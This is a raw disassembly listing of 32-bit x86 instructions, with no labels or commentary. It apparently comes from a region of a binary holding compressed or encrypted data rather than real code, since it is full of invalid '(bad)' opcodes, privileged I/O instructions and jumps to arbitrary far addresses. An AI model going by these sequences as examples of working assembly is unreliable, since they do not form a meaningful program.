  41bdd6:	shr    BYTE PTR [edi],0x94
  41bdd9:	xor    eax,0xf3053eaa
  41bdde:	out    0xb4,al
  41bde0:	xchg   esi,eax
  41bde1:	push   eax
  41bde2:	push   esi
  41bde3:	aad    0x2b
  41bde5:	jns    0x41bd93
  41bde7:	ds icebp 
  41bde9:	and    esp,DWORD PTR ds:0x8c7654a0
  41bdef:	mov    ecx,0x1b501e9c
  41bdf4:	push   cs
  41bdf5:	pop    esi
  41bdf6:	mov    esi,DWORD PTR [ebx-0x37]
  41bdf9:	lods   al,BYTE PTR ds:[esi]
  41bdfa:	int3   
  41bdfb:	cmp    eax,0x50a36774
  41be00:	mov    dl,0x4e
  41be02:	xor    al,0xb7
  41be04:	and    DWORD PTR [eax+0x5aec71a6],ecx
  41be0a:	daa    
  41be0b:	jnp    0x41be13
  41be0d:	dec    esi
  41be0e:	mov    ebx,0xc8742d48
  41be13:	mov    edi,0xa0c5ae07
  41be18:	jmp    0xc6e43429
  41be1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be1e:	or     DWORD PTR [esi-0x5f],0x56
  41be22:	in     al,dx
  41be23:	repnz (bad) 
  41be26:	and    eax,0xcb52cc68
  41be2b:	(bad)  [edx+0x75]
  41be2e:	inc    edi
  41be2f:	jo     0x41be70
  41be31:	sub    al,0x62
  41be33:	mov    BYTE PTR [edi],ch
  41be35:	enter  0x76a5,0x25
  41be39:	das    
  41be3a:	aaa    
  41be3b:	add    edx,DWORD PTR [edi+0x10259b35]
  41be41:	dec    edi
  41be42:	mov    ebp,0xc4bb1ef6
  41be47:	dec    ebp
  41be48:	xlat   BYTE PTR ds:[ebx]
  41be49:	fiadd  WORD PTR [ecx+edx*2]
  41be4c:	cdq    
  41be4d:	das    
  41be4e:	push   es
  41be4f:	and    BYTE PTR [eax],al
  41be51:	loopne 0x41beaa
  41be53:	add    dl,ah
  41be55:	loopne 0x41be67
  41be57:	bound  ebp,QWORD PTR [ebx]
  41be59:	ret    0x758f
  41be5c:	add    BYTE PTR [ecx+0x23a6dd1b],0x77
  41be63:	scas   eax,DWORD PTR es:[edi]
  41be64:	add    DWORD PTR [esi+0x78],ebp
  41be67:	mov    dl,0x36
  41be69:	lock and DWORD PTR [edi+esi*2-0x6a0b7bbb],edi
  41be71:	inc    edx
  41be72:	mov    DWORD PTR [ebx],esp
  41be74:	jae    0x41beef
  41be76:	adc    al,0xfd
  41be78:	repnz push ebp
  41be7a:	adc    al,0x17
  41be7c:	jl     0x41be00
  41be7e:	popf   
  41be7f:	push   cs
  41be80:	or     eax,0xff6a7909
  41be85:	jbe    0x41beb6
  41be87:	sbb    BYTE PTR [ebx-0x4bb7207b],al
  41be8d:	sub    esi,DWORD PTR [edx]
  41be8f:	xchg   ecx,eax
  41be90:	mov    dh,0xba
  41be92:	jle    0x41be69
  41be94:	pushf  
  41be95:	mov    al,0x60
  41be97:	push   ebx
  41be98:	in     eax,dx
  41be99:	sbb    BYTE PTR [edi],dh
  41be9b:	add    BYTE PTR [ecx-0x13],cl
  41be9e:	lock or BYTE PTR [eax+0x1a489975],dh
  41bea5:	cmp    DWORD PTR [ebx],eax
  41bea7:	push   ebp
  41bea8:	inc    esp
  41bea9:	(bad)  
  41beaa:	jmp    DWORD PTR [eax]
  41beac:	les    edx,FWORD PTR [ecx]
  41beae:	stos   BYTE PTR es:[edi],al
  41beaf:	inc    esp
  41beb0:	mov    ah,0xf0
  41beb2:	cmp    eax,0x8964a24d
  41beb7:	sbb    al,0xb2
  41beb9:	xchg   DWORD PTR [ecx],ecx
  41bebb:	mov    bh,0xff
  41bebd:	ja     0x41befc
  41bebf:	pop    esp
  41bec0:	cli    
  41bec1:	in     al,dx
  41bec2:	mov    DWORD PTR [ecx+0x1ab38cfa],edx
  41bec8:	dec    edi
  41bec9:	ret    
  41beca:	loope  0x41bed0
  41becc:	retf   0xdca0
  41becf:	xlat   BYTE PTR ds:[ebx]
  41bed0:	jmp    DWORD PTR [edi+0x29]
  41bed3:	inc    eax
  41bed4:	test   esp,esp
  41bed6:	neg    DWORD PTR [edi+0x4f]
  41bed9:	je     0x41be86
  41bedb:	bnd ret 
  41bedd:	pop    esp
  41bede:	pop    ecx
  41bedf:	sti    
  41bee0:	jmp    0xb285:0x9dbcff04
  41bee7:	(bad)  
  41bee8:	call   0x9afd:0x4377d52
  41beef:	pop    es
  41bef0:	push   esi
  41bef1:	fidiv  WORD PTR [esi-0x6b]
  41bef4:	repnz cmp BYTE PTR [edi-0x1b],ch
  41bef8:	pop    ebp
  41bef9:	xchg   ebx,eax
  41befa:	leave  
  41befb:	sbb    bh,bl
  41befd:	int3   
  41befe:	ret    0xdd3e
  41bf01:	into   
  41bf02:	test   edx,edi
  41bf04:	imul   ebx,esp,0x10bf2cc7
  41bf0a:	loopne 0x41bf05
  41bf0c:	in     eax,0xc6
  41bf0e:	mov    ds:0x5a55b9e2,al
  41bf13:	in     eax,0x56
  41bf15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf16:	sti    
  41bf17:	rcr    BYTE PTR [edi-0x7ba781e5],cl
  41bf1d:	arpl   WORD PTR [edi-0x7c53a6a8],bx
  41bf23:	fisub  DWORD PTR [ecx+eax*2+0x3de6dd0f]
  41bf2a:	xchg   esi,eax
  41bf2b:	nop
  41bf2c:	mov    eax,ds:0x48b1a494
  41bf31:	fdivr  st,st(4)
  41bf33:	cli    
  41bf34:	iret   
  41bf35:	pusha  
  41bf36:	jmp    0xc09b:0x513e5f50
  41bf3d:	sbb    eax,0x54d9309a
  41bf42:	(bad)  
  41bf43:	cdq    
  41bf44:	ret    
  41bf45:	add    DWORD PTR [eax],esp
  41bf47:	push   ecx
  41bf48:	pop    esi
  41bf49:	call   0xee144d04
  41bf4e:	loopne 0x41bedd
  41bf50:	dec    edi
  41bf51:	sti    
  41bf52:	xchg   ecx,eax
  41bf54:	push   edx
  41bf55:	xor    BYTE PTR [ecx+0x32],0x8b
  41bf59:	sbb    ebx,DWORD PTR [ebx]
  41bf5b:	xchg   edx,eax
  41bf5c:	sti    
  41bf5d:	repnz mov ah,0xca
  41bf60:	inc    esi
  41bf61:	push   ds
  41bf62:	call   0x5921:0x254794f4
  41bf69:	stc    
  41bf6a:	arpl   bx,sp
  41bf6c:	outs   dx,DWORD PTR ds:[esi]
  41bf6d:	aaa    
  41bf6e:	mov    gs,edx
  41bf70:	retf   0x5faf
  41bf73:	push   0xffffffda
  41bf75:	cmp    DWORD PTR [ebp+ebp*1+0x5a],0xb1a138d6
  41bf7d:	pop    ds
  41bf7e:	pop    edi
  41bf7f:	addr16 cdq 
  41bf81:	cli    
  41bf82:	jne    0x41bf1b
  41bf84:	add    al,0xfa
  41bf86:	aad    0xb9
  41bf88:	dec    edx
  41bf89:	mov    esi,0x48f90c83
  41bf8e:	mov    eax,0xf464bbb4
  41bf93:	mov    ah,0x90
  41bf95:	(bad)  
  41bf96:	cld    
  41bf97:	ret    
  41bf98:	div    DWORD PTR ds:0x769d3f64
  41bf9e:	pop    ecx
  41bf9f:	mov    edx,0x39135050
  41bfa4:	stos   BYTE PTR es:[edi],al
  41bfa5:	ror    BYTE PTR [edi-0x190c354e],cl
  41bfab:	mov    al,0xb0
  41bfad:	jnp    0x41bf46
  41bfaf:	mov    eax,ds:0xc69c8421
  41bfb4:	jmp    0xbfb1:0x79275cd
  41bfbb:	retf   
  41bfbc:	shl    DWORD PTR [eax-0x58],1
  41bfbf:	lock xchg edx,eax
  41bfc1:	jmp    0xec55d351
  41bfc6:	popf   
  41bfc7:	mov    ch,0x80
  41bfc9:	xchg   DWORD PTR [edi],eax
  41bfcb:	dec    esp
  41bfcc:	mov    eax,0x18b37047
  41bfd1:	pop    eax
  41bfd2:	and    al,0xda
  41bfd4:	mov    eax,ds:0xed1dc3ea
  41bfd9:	loop   0x41bfd5
  41bfdb:	or     DWORD PTR [ebp+0x75db508],edi
  41bfe1:	jb     0x41bfe4
  41bfe3:	cmp    eax,0xfe5cee41
  41bfe8:	pushf  
  41bfe9:	fcmovnbe st,st(1)
  41bfeb:	scas   al,BYTE PTR es:[edi]
  41bfec:	push   eax
  41bfed:	(bad)  
  41bfee:	jl     0x41c057
  41bff0:	jmp    0x41c06a
  41bff2:	inc    BYTE PTR [edi-0x2d3910de]
  41bff8:	repnz scas al,BYTE PTR es:[edi]
  41bffa:	cmc    
  41bffb:	or     al,0xcc
  41bffd:	fisub  DWORD PTR [ecx-0x2e]
  41c000:	xchg   ecx,eax
  41c001:	push   ecx
  41c002:	cmp    al,0x29
  41c004:	test   DWORD PTR [esi+0x2dece89c],0x7f74b3fe
  41c00e:	pop    DWORD PTR [edi-0x5d42a0ec]
  41c014:	shl    DWORD PTR [esi+0x68e7987],1
  41c01a:	cs mov es,WORD PTR fs:[ebx+0x3dcb6137]
  41c022:	push   esi
  41c023:	ss ret 0xc90e
  41c027:	or     eax,0xc2f3de9f
  41c02c:	jno    0x41bfe9
  41c02e:	cli    
  41c02f:	bound  esp,QWORD PTR [ecx-0x64]
  41c032:	pop    edi
  41c033:	loope  0x41bfd6
  41c035:	cwde   
  41c036:	push   ss
  41c037:	pop    edi
  41c038:	div    BYTE PTR [edx+0xdf35477]
  41c03e:	ins    DWORD PTR es:[edi],dx
  41c03f:	push   edi
  41c040:	lds    ebp,FWORD PTR [edi]
  41c042:	cmp    cl,cl
  41c044:	rol    DWORD PTR [esi-0x73],0x98
  41c048:	jg     0xe324ee99
  41c04e:	mov    DWORD PTR [ecx],eax
  41c050:	push   edx
  41c051:	clc    
  41c052:	daa    
  41c053:	push   0x30befe13
  41c058:	and    al,0x4a
  41c05a:	jb     0x41c0b7
  41c05c:	jne    0x41c0d8
  41c05e:	or     eax,0xd38eece6
  41c063:	mov    al,0xbe
  41c065:	inc    ecx
  41c066:	(bad)  
  41c067:	sub    eax,0xf9b31bf3
  41c06c:	pop    ebx
  41c06d:	dec    esp
  41c06e:	mov    ebp,0xad224b20
  41c073:	bound  ebp,QWORD PTR [edi+ebp*1-0x28]
  41c077:	mov    bl,dl
  41c079:	mov    bl,BYTE PTR [ebx]
  41c07b:	cmp    al,0xae
  41c07d:	mov    esp,0x95d6c3b5
  41c082:	call   0x5f74309e
  41c087:	xchg   BYTE PTR [ecx-0x4b],dl
  41c08a:	xor    cl,BYTE PTR [ebx+eax*1]
  41c08d:	xor    eax,0xe8bba544
  41c092:	jmp    0x8db0caf4
  41c097:	loopne 0x41c0c5
  41c099:	jmp    0x41c114
  41c09b:	jle    0x41c083
  41c09d:	mov    dl,0x5b
  41c09f:	cwde   
  41c0a0:	sbb    al,0xb8
  41c0a2:	pop    es
  41c0a3:	scas   al,BYTE PTR es:[di]
  41c0a5:	mov    ah,0x2b
  41c0a7:	arpl   WORD PTR [ecx],di
  41c0a9:	inc    ebx
  41c0aa:	retf   0x6410
  41c0ad:	sbb    DWORD PTR [esi],0xfffffff1
  41c0b0:	(bad)  
  41c0b1:	in     al,0x9b
  41c0b3:	jno    0x41c08e
  41c0b5:	popf   
  41c0b6:	idiv   DWORD PTR [esi+eax*2]
  41c0b9:	push   edi
  41c0ba:	xchg   ebx,eax
  41c0bb:	std    
  41c0bc:	test   al,0xe9
  41c0be:	pop    ds
  41c0bf:	cmp    dl,BYTE PTR [ebx+ebx*8]
  41c0c2:	or     al,0xd5
  41c0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0c5:	add    ebx,DWORD PTR [ebx-0x6e0a5d39]
  41c0cb:	outs   dx,DWORD PTR ds:[esi]
  41c0cc:	aaa    
  41c0cd:	pop    edi
  41c0ce:	pop    edx
  41c0cf:	xor    eax,0xf8230810
  41c0d4:	xchg   BYTE PTR [edi+0x6f06b5b7],dl
  41c0da:	fwait
  41c0db:	xor    bh,BYTE PTR [edx-0x40]
  41c0de:	dec    esp
  41c0df:	xchg   edi,eax
  41c0e0:	push   edx
  41c0e1:	cli    
  41c0e2:	adc    DWORD PTR [eax],esp
  41c0e4:	pop    ebp
  41c0e5:	(bad)  
  41c0e6:	lahf   
  41c0e7:	cs test al,0xa3
  41c0ea:	mov    al,0xd6
  41c0ec:	cmp    eax,0xe967497f
  41c0f1:	call   0xb417:0x1089f8af
  41c0f8:	pop    ecx
  41c0f9:	fcmovnu st,st(4)
  41c0fb:	and    DWORD PTR [esi-0x70],ebx
  41c0fe:	test   BYTE PTR [esi+0x454b84c0],al
  41c104:	cmp    eax,0xc7ce40
  41c109:	or     eax,DWORD PTR [edx-0x7ed61e6f]
  41c10f:	js     0x41c0ce
  41c111:	fs mov ebp,fs
  41c114:	xchg   dl,dh
  41c116:	adc    esp,DWORD PTR [ebp+eax*4-0xb]
  41c11a:	xchg   ebx,eax
  41c11b:	adc    ah,BYTE PTR [ebp+0x2d0b4f20]
  41c121:	rcl    BYTE PTR ds:0xbf68a002,0x76
  41c128:	inc    esi
  41c129:	test   eax,0x4bf059af
  41c12e:	mov    ax,0xfa33
  41c132:	es fwait
  41c134:	rcr    DWORD PTR [ecx+0x332f97ca],cl
  41c13a:	in     al,dx
  41c13b:	xchg   esp,eax
  41c13c:	cdq    
  41c13d:	sub    DWORD PTR [ebp-0x24],0x6f
  41c141:	xchg   edx,eax
  41c142:	leave  
  41c143:	xchg   ecx,eax
  41c144:	push   ebp
  41c145:	in     al,0x4
  41c147:	fs mov es,edi
  41c14a:	mov    ch,0xe6
  41c14c:	inc    esi
  41c14d:	jae    0x41c0e5
  41c14f:	rcr    DWORD PTR [ecx-0x1e76a432],0x69
  41c156:	cli    
  41c157:	scas   eax,DWORD PTR es:[edi]
  41c158:	(bad)  
  41c159:	aam    0x74
  41c15b:	daa    
  41c15c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c15d:	shl    BYTE PTR [eax+0x29],1
  41c160:	push   es
  41c161:	push   esi
  41c162:	dec    esp
  41c163:	lock dec ecx
  41c165:	out    0x4,al
  41c167:	add    edx,DWORD PTR [ebx+0x1d]
  41c16a:	loope  0x41c1b5
  41c16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c16d:	mov    al,0x76
  41c16f:	mov    ecx,0x66b3e780
  41c174:	mov    esi,0x54a647fd
  41c179:	xor    BYTE PTR [edi-0xc549290],0xbb
  41c180:	dec    eax
  41c181:	xor    al,0x25
  41c183:	or     ch,ch
  41c185:	retf   
  41c186:	jmp    FWORD PTR [edi+0x3cc40fe4]
  41c18c:	push   cs
  41c18d:	jecxz  0x41c1db
  41c18f:	jmp    DWORD PTR [ebx]
  41c191:	js     0x41c1a3
  41c193:	xchg   edi,eax
  41c194:	js     0x41c198
  41c196:	add    eax,0x78245f87
  41c19b:	div    esp
  41c19d:	xchg   ebx,eax
  41c19e:	cmp    al,0xad
  41c1a0:	inc    edi
  41c1a1:	rcl    DWORD PTR [edi-0x27],1
  41c1a4:	push   edi
  41c1a5:	jae    0x41c12d
  41c1a7:	or     al,ch
  41c1a9:	mov    DWORD PTR ds:0x971362c3,esp
  41c1af:	fst    QWORD PTR [edi]
  41c1b1:	fwait
  41c1b2:	or     BYTE PTR [ebx+0x583218f1],ch
  41c1b8:	adc    dh,dh
  41c1ba:	jnp    0x41c15c
  41c1bc:	cmp    DWORD PTR [eax-0x3a],ecx
  41c1bf:	cmc    
  41c1c0:	mov    edi,0x7b683072
  41c1c5:	loope  0x41c153
  41c1c7:	pop    esp
  41c1c8:	or     eax,0x5700b0e7
  41c1cd:	xchg   ebp,eax
  41c1ce:	(bad)  
  41c1cf:	and    edx,edx
  41c1d1:	dec    esp
  41c1d2:	or     bl,BYTE PTR [eax]
  41c1d4:	loopne 0x41c191
  41c1d6:	push   0x41
  41c1d8:	xchg   ebx,eax
  41c1d9:	stc    
  41c1da:	and    bl,BYTE PTR [eax+0x1d115856]
  41c1e0:	mov    ?,WORD PTR [eax-0x2f]
  41c1e3:	xor    DWORD PTR [eax+0x23],ebx
  41c1e6:	xchg   ebx,eax
  41c1e7:	test   ebx,edx
  41c1e9:	mov    ecx,DWORD PTR [edx+eax*2-0x4a]
  41c1ed:	fsub   DWORD PTR ds:0x81f8fd61
  41c1f3:	mov    ecx,0xa2067fea
  41c1f8:	mov    edx,DWORD PTR [ebp+0x877d4f]
  41c1fe:	mov    eax,DWORD PTR [eax]
  41c200:	fst    DWORD PTR [eax+0x38ebd81]
  41c206:	inc    ebx
  41c207:	lds    ebp,FWORD PTR [esi-0x68]
  41c20a:	lahf   
  41c20b:	and    ebp,eax
  41c20d:	stc    
  41c20e:	fmul   QWORD PTR [edi-0x17]
  41c211:	or     al,0x38
  41c213:	pusha  
  41c214:	xor    esi,DWORD PTR [esi+eiz*2+0x3]
  41c218:	lock dec esi
  41c21a:	sahf   
  41c21b:	and    BYTE PTR [ecx+esi*2],bh
  41c21e:	mov    esp,0x534cf5d7
  41c223:	pop    es
  41c224:	pushf  
  41c225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c226:	test   al,0x47
  41c228:	push   esp
  41c229:	push   eax
  41c22a:	out    0x19,eax
  41c22c:	ret    
  41c22d:	inc    esp
  41c22e:	xor    eax,0xbde94868
  41c233:	scas   eax,DWORD PTR es:[edi]
  41c234:	into   
  41c235:	aam    0x8a
  41c237:	(bad)  
  41c238:	lods   eax,DWORD PTR ds:[esi]
  41c239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c23a:	mov    edi,0x2acb6530
  41c23f:	mov    ah,0x4d
  41c241:	leave  
  41c242:	scas   al,BYTE PTR es:[edi]
  41c243:	fwait
  41c244:	jns    0x41c296
  41c246:	into   
  41c247:	sub    eax,0x818ef490
  41c24c:	mov    ebx,0x8ff7c0a4
  41c251:	cmp    al,0xb4
  41c253:	add    al,BYTE PTR [ebp+0x135b2d42]
  41c259:	icebp  
  41c25a:	rol    esi,0x5
  41c25d:	outs   dx,DWORD PTR ds:[esi]
  41c25e:	dec    edx
  41c25f:	into   
  41c260:	ins    DWORD PTR es:[edi],dx
  41c261:	push   ds
  41c262:	dec    esp
  41c263:	nop
  41c264:	jns    0x41c216
  41c266:	push   0xbe52057a
  41c26b:	mov    BYTE PTR [ecx],dh
  41c26d:	mov    edx,0x968e919b
  41c272:	push   es
  41c273:	dec    ebp
  41c274:	aas    
  41c275:	pop    es
  41c276:	inc    ebp
  41c277:	call   0x3d6819ee
  41c27c:	mov    esi,0x18bc6574
  41c281:	fldcw  WORD PTR [ebx-0x28b3001d]
  41c287:	sub    DWORD PTR [edi],eax
  41c289:	inc    ecx
  41c28a:	ss mov ecx,0xdf9b534f
  41c290:	cmovno ebp,DWORD PTR [ebp+0x14]
  41c294:	and    BYTE PTR [esi],ch
  41c296:	ja     0x41c28f
  41c298:	in     al,0x49
  41c29a:	add    eax,0x859b9e72
  41c29f:	mov    es,WORD PTR [edx+0x6e072b42]
  41c2a5:	int3   
  41c2a6:	pop    es
  41c2a7:	retf   0x6a38
  41c2aa:	shr    DWORD PTR [ebx],0x3c
  41c2ad:	sbb    ecx,DWORD PTR [esi+eiz*4+0x45]
  41c2b1:	adc    al,0x20
  41c2b3:	sti    
  41c2b4:	mov    BYTE PTR [ebx-0x50],dh
  41c2b7:	inc    ebx
  41c2b8:	jno    0x41c295
  41c2ba:	(bad)  
  41c2bb:	es out dx,eax
  41c2bd:	iret   
  41c2be:	dec    esp
  41c2bf:	xchg   ecx,eax
  41c2c0:	call   0xe304f3b9
  41c2c5:	icebp  
  41c2c6:	adc    al,0x76
  41c2c8:	xchg   edi,eax
  41c2c9:	push   esp
  41c2ca:	dec    ebp
  41c2cb:	mov    cl,0x28
  41c2cd:	hlt    
  41c2ce:	aad    0xe0
  41c2d0:	jmp    0x7324:0xbf0cf7fd
  41c2d7:	(bad)  
  41c2d8:	mov    dh,0x13
  41c2da:	and    eax,0x983d7be
  41c2df:	mov    ds:0xd9f74949,al
  41c2e4:	xor    eax,0xffb9640c
  41c2e9:	clc    
  41c2ea:	int3   
  41c2eb:	push   esp
  41c2ec:	jns    0x41c2fe
  41c2ee:	push   esp
  41c2ef:	push   ds
  41c2f0:	push   es
  41c2f1:	push   es
  41c2f2:	cmp    al,0x50
  41c2f4:	xor    edi,DWORD PTR gs:[ebx+0x4b1fed1]
  41c2fb:	cmp    edx,DWORD PTR ds:0xc3b770d2
  41c301:	xchg   ebp,eax
  41c302:	ret    0x6b8a
  41c305:	xlat   BYTE PTR ds:[ebx]
  41c306:	mov    eax,0x6cc70848
  41c30b:	xor    bl,BYTE PTR [ebx]
  41c30d:	dec    ebp
  41c30e:	cmp    DWORD PTR [edi+eax*4],eax
  41c311:	aam    0x47
  41c313:	aas    
  41c314:	ss dec esi
  41c316:	push   edx
  41c317:	dec    eax
  41c318:	add    edi,DWORD PTR [eax+0x429a0bd9]
  41c31e:	dec    esi
  41c31f:	hlt    
  41c320:	or     al,0xd5
  41c322:	jge    0x41c2b4
  41c324:	inc    ebx
  41c325:	pop    ebx
  41c326:	bnd jmp 0x41c3a6
  41c329:	lea    ebp,ds:0xaa522c18
  41c32f:	lock mov eax,0xa69159eb
  41c335:	stos   DWORD PTR es:[edi],eax
  41c336:	jns    0x41c38c
  41c338:	dec    ebx
  41c339:	pop    ecx
  41c33a:	fild   QWORD PTR [ecx-0x6b04e22c]
  41c340:	xor    eax,0xaaa29c9a
  41c345:	std    
  41c346:	cmp    cl,BYTE PTR [ecx+0x5bc73981]
  41c34c:	rcl    DWORD PTR [ebx-0xea5cef8],cl
  41c352:	pop    esi
  41c353:	inc    ecx
  41c354:	mov    ebp,DWORD PTR [ebx+0x7b]
  41c357:	cdq    
  41c358:	stos   DWORD PTR es:[edi],eax
  41c359:	addr16 popf 
  41c35b:	in     al,dx
  41c35c:	addr16 adc al,0xb5
  41c35f:	cmp    edi,DWORD PTR [ebx-0x12]
  41c362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c363:	sub    eax,0x1a03b4e6
  41c368:	mov    al,ds:0x559618be
  41c36d:	adc    eax,0xe6926d90
  41c372:	pop    eax
  41c373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c374:	push   eax
  41c375:	jmp    0x6fa0:0x92f8978a
  41c37c:	test   eax,0x23b90519
  41c381:	xor    BYTE PTR [edi+0x4c87bd82],bl
  41c387:	pop    ds
  41c388:	es push edi
  41c38a:	fsub   st(1),st
  41c38c:	test   al,0x5a
  41c38e:	hlt    
  41c38f:	shl    esi,1
  41c391:	nop
  41c392:	mov    ax,ds:0x7fb5ef09
  41c398:	addr16 std 
  41c39a:	cmp    edi,ebp
  41c39c:	mov    bh,0x8
  41c39e:	xor    ebx,esi
  41c3a0:	pop    es
  41c3a1:	sub    al,0x6e
  41c3a3:	or     eax,0x5620107e
  41c3a8:	mov    cl,BYTE PTR [eax+0x43a94eb2]
  41c3ae:	scas   eax,DWORD PTR es:[edi]
  41c3af:	aaa    
  41c3b0:	jmp    0x345d:0x18a5e9fb
  41c3b7:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3b9:	xchg   BYTE PTR [ecx],ah
  41c3bb:	mov    ah,0xf0
  41c3bd:	loope  0x41c43d
  41c3bf:	jnp    0x41c38a
  41c3c1:	or     al,0x98
  41c3c3:	in     eax,0xf0
  41c3c5:	sbb    dh,BYTE PTR [ecx-0x69]
  41c3c8:	xlat   BYTE PTR ds:[ebx]
  41c3c9:	push   eax
  41c3ca:	shld   esp,ecx,0x5e
  41c3ce:	(bad)  
  41c3cf:	push   edi
  41c3d0:	in     eax,dx
  41c3d1:	jbe    0x41c446
  41c3d3:	ss inc edx
  41c3d5:	shl    ah,0x4f
  41c3d8:	cmp    eax,0x99103543
  41c3dd:	in     al,0x1a
  41c3df:	add    BYTE PTR [ebx+0x3b],dh
  41c3e2:	daa    
  41c3e3:	stos   BYTE PTR es:[edi],al
  41c3e4:	jbe    0x41c42b
  41c3e6:	mov    bl,0x67
  41c3e8:	mov    edi,esp
  41c3ea:	dec    ebp
  41c3eb:	jge    0x41c3dd
  41c3ed:	leave  
  41c3ee:	aad    0xbd
  41c3f0:	retf   0x3c9
  41c3f3:	dec    ecx
  41c3f4:	inc    esp
  41c3f5:	lods   al,BYTE PTR ds:[esi]
  41c3f6:	and    DWORD PTR [ebx-0x37436af3],edi
  41c3fc:	add    eax,0x656a4240
  41c401:	ret    
  41c402:	dec    esi
  41c403:	mov    dl,0xd2
  41c405:	int3   
  41c406:	addr16 push eax
  41c408:	adc    eax,DWORD PTR [eax]
  41c40a:	loop   0x41c46b
  41c40c:	test   al,0x78
  41c40e:	icebp  
  41c40f:	pop    eax
  41c410:	or     DWORD PTR [eax-0x10d9b486],ecx
  41c416:	push   esi
  41c417:	jnp    0x41c47c
  41c419:	ja     0x41c3ed
  41c41b:	push   edi
  41c41c:	iret   
  41c41d:	inc    edi
  41c41e:	dec    edx
  41c41f:	pop    esi
  41c420:	mov    dl,0xec
  41c422:	push   cs
  41c423:	pop    dx
  41c425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c426:	call   0xaaa6:0x5ed19691
  41c42d:	jbe    0x41c44c
  41c42f:	jne    0x41c42d
  41c431:	inc    ebx
  41c432:	pusha  
  41c433:	addr16 leave 
  41c435:	or     eax,0x15abe4
  41c43a:	(bad)  
  41c43b:	shr    DWORD PTR [eax-0x78],1
  41c43e:	mov    cl,0x39
  41c440:	xchg   ebp,eax
  41c441:	and    edi,esp
  41c443:	test   BYTE PTR ds:0xf66acbc9,0x98
  41c44a:	dec    ecx
  41c44b:	jno    0x41c42c
  41c44d:	xor    dl,dh
  41c44f:	adc    eax,0x1b1d5a8d
  41c454:	leave  
  41c455:	mov    ebx,0xe4527690
  41c45a:	mov    edx,DWORD PTR [eax+0xed53943]
  41c460:	ins    BYTE PTR es:[edi],dx
  41c461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c462:	mov    al,ds:0xe6162652
  41c467:	or     al,0x26
  41c469:	push   cs
  41c46a:	(bad)  
  41c46b:	scas   eax,DWORD PTR es:[edi]
  41c46c:	das    
  41c46d:	loop   0x41c480
  41c46f:	xchg   edx,eax
  41c470:	lods   eax,DWORD PTR ds:[esi]
  41c471:	xor    DWORD PTR [edi-0x3f],esp
  41c474:	hlt    
  41c475:	xor    DWORD PTR [eax-0x120e1906],esi
  41c47b:	mov    ds:0xe0c2cf74,eax
  41c480:	psubusb mm5,QWORD PTR ss:[eax+0x39]
  41c485:	clc    
  41c486:	pop    edi
  41c487:	mov    esi,0xbd21eecb
  41c48c:	cdq    
  41c48d:	outs   dx,BYTE PTR ds:[esi]
  41c48e:	xchg   BYTE PTR [ecx],bl
  41c490:	pop    ebx
  41c491:	sti    
  41c492:	gs pop esp
  41c494:	lahf   
  41c495:	and    eax,0xaaeed524
  41c49a:	sub    ebp,DWORD PTR [ecx-0x1e]
  41c49d:	or     edx,esp
  41c49f:	daa    
  41c4a0:	and    al,0x7
  41c4a2:	cli    
  41c4a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4a4:	cmp    bl,BYTE PTR [ebp+0x6b]
  41c4a7:	sub    edi,DWORD PTR [esi]
  41c4a9:	push   edi
  41c4aa:	sub    esp,DWORD PTR [esi]
  41c4ac:	(bad)  
  41c4ad:	mov    dh,0xea
  41c4af:	out    dx,al
  41c4b0:	xchg   BYTE PTR [esi],ah
  41c4b2:	or     al,0x35
  41c4b4:	pop    es
  41c4b5:	sbb    BYTE PTR [edx+0x5b],cl
  41c4b8:	in     eax,dx
  41c4b9:	xchg   esp,eax
  41c4ba:	xor    eax,DWORD PTR [eax+0x2a688b72]
  41c4c0:	jne    0x41c52e
  41c4c2:	aaa    
  41c4c3:	adc    al,0x49
  41c4c5:	xor    eax,0x2fe38b6
  41c4ca:	imul   edi,esi,0xd69d9d4b
  41c4d0:	push   0x8a6a8ee2
  41c4d5:	je     0x41c4bd
  41c4d7:	push   ecx
  41c4d8:	in     al,0x9f
  41c4da:	mov    WORD PTR [ebp-0x58672dcd],cs
  41c4e0:	dec    edx
  41c4e1:	jge    0x41c488
  41c4e3:	jo     0x41c51e
  41c4e5:	jbe    0x41c501
  41c4e7:	sub    dl,bl
  41c4e9:	lock push esp
  41c4eb:	inc    esi
  41c4ec:	je     0x41c4f2
  41c4ee:	fnsave [edx+0x1cf88d32]
  41c4f4:	mov    DWORD PTR [ecx],ebp
  41c4f6:	sbb    al,0xb3
  41c4f8:	pop    ds
  41c4f9:	cmp    BYTE PTR gs:[edx+0x721df663],ch
  41c500:	or     al,0x5b
  41c502:	dec    edx
  41c503:	inc    ebp
  41c504:	dec    eax
  41c505:	mov    esp,0x124c9fc4
  41c50a:	or     BYTE PTR [ebp-0x69],ch
  41c50d:	inc    ebx
  41c50e:	call   0x6b5f8751
  41c513:	pushf  
  41c514:	adc    DWORD PTR [edi],0xffffff9b
  41c517:	sub    DWORD PTR [esi*2+0x6c87ae34],esp
  41c51e:	ffreep st(3)
  41c520:	fs mov ah,0xc
  41c523:	out    dx,al
  41c524:	out    0x5e,eax
  41c526:	gs cld 
  41c528:	fbstp  TBYTE PTR [edi+0x7d]
  41c52b:	cmp    edi,DWORD PTR [ebx-0x6f]
  41c52e:	aaa    
  41c52f:	scas   eax,DWORD PTR es:[edi]
  41c530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c531:	leave  
  41c532:	repnz adc eax,0xb0040a7
  41c538:	cli    
  41c539:	stc    
  41c53a:	or     cl,dl
  41c53c:	out    0x99,eax
  41c53e:	dec    ebx
  41c53f:	adc    BYTE PTR [esi+edi*2-0x1a59dc1d],bl
  41c546:	les    edx,FWORD PTR [ebp-0x63]
  41c549:	push   ds
  41c54a:	aam    0xa0
